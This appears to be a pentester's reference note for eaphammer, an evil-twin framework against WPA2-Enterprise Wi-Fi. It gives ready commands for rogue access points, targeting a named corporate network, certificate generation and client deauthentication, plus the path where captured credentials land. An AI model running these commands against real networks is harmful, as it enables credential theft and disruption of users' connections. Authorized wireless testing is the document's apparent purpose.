---
tags: [tool, wireless, wifi, enterprise]
tool: eaphammer
category: Wireless
installed: true
---

# Eaphammer - Enterprise WiFi Attack Framework

## Overview
Targeted Evil Twin attacks against WPA2-Enterprise networks (PEAP, EAP-TTLS)

## Location
~/tools/wireless/eaphammer/eaphammer

## Usage

### Basic Attack
sudo ./eaphammer --wpa2-enterprise -i wlan0

### Target Specific SSID
sudo ./eaphammer --wpa2-enterprise -i wlan0 --essid "CorpWiFi"

### Generate Certificates
sudo ./eaphammer --cert-wizard

### Deauth Clients
sudo ./eaphammer --deauth -i wlan0 -b AA:BB:CC:DD:EE:FF

### Credential Output
Captured credentials saved to /var/lib/eaphammer/creds.txt

### Options
--wpa2-enterprise : Enterprise attack mode
--essid : Target network name
--interface : Wireless interface
--deauth : Deauth specific client
--cert-wizard : Generate certificates
